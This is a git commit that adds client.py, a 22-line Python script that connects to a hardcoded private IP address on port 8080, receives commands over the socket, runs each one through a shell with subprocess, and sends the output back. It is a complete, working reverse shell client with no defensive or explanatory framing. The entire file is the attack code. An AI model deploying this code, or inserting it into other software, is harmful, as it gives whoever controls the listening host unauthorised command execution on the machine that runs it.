bdd7dc754ade69fc124b35081abf7afcff1de7a0
André <160508005+andrenascimentobarbosa@users.noreply.github.com>
2024-05-06 19:10:41 -0300

    Create client.py

---
+++ client.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python3
+
+import socket
+import subprocess
+
+host = '172.22.254.158'
+port = 8080
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((host, port))
+
+while True:
+    comm = client.recv(1024).decode()
+    if not comm:
+        break
+    elif comm == '':
+        pass
+    else:
+        output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
+        client.send(output.encode())
+
+client.close()
